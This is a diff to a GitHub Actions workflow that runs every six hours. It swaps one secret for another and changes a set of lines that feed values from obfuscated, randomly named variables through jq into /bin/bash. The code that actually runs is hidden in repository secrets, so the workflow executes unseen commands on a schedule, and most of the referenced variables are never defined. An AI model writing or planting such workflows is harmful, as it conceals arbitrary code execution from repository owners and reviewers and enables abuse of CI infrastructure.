@@ -1,9 +1,8 @@
 name: processcommitment
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 3/6 * * *'
+    - cron: '39 5/6 * * *'
 
 jobs:
   build:
@@ -12,19 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: processcommitment
         env:
-          t11: ${{ secrets.t11 }}
+          icziq22998: ${{ secrets.icziq22998 }}
         run: |
-          echo $t11 | jq -r .zay196 | /bin/bash
-          echo $x244 | jq -r .gfb1569 | /bin/bash
-          echo $mzn0 | jq -r .o5 | /bin/bash
-          echo $lbi164 | jq -r .ofjk69 | /bin/bash
-          echo $e94240 | jq -r .gmxr7950 | /bin/bash
-          echo $ryip2183 | jq -r .qtm9 | /bin/bash
-          echo $lf7821 | jq -r .wyb8007 | /bin/bash
-          echo $pkc60 | jq -r .g65369 | /bin/bash
-          echo $xeiw83852 | jq -r .ktgw6646 | /bin/bash
-          echo $sg4439 | jq -r .o1008 | /bin/bash
-          echo $lgn85664 | jq -r .mooo0 | /bin/bash
-          echo $umic0 | jq -r .cm92960 | /bin/bash
-          echo $tv48 | jq -r .d923 | /bin/bash
+          echo $icziq22998 | jq -r .hzob01223 | /bin/bash
+          echo $qag63971 | jq -r .zov6 | /bin/bash
+          echo $kknme22 | jq -r .xzi6 | /bin/bash
+          echo $pe4772 | jq -r .kwzn67 | /bin/bash
 
